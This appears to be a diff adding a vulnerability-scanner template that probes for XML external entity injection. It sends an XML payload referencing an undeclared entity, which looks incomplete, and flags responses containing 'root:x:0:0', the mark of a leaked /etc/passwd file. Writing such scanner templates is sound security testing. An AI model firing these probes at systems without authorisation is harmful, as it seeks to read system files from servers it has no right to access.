@@ -1,0 +1,21 @@
+id: xxe-021
+name: 'XXE via xml'
+severity: critical
+type: active
+tags:
+  - xxe
+  - injection
+  - xml
+description: 'XXE entity via xml'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      xml:
+        - '<?xml version="1.0"?><r>&xxe;</r>'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
+          - 'XXE_OK'
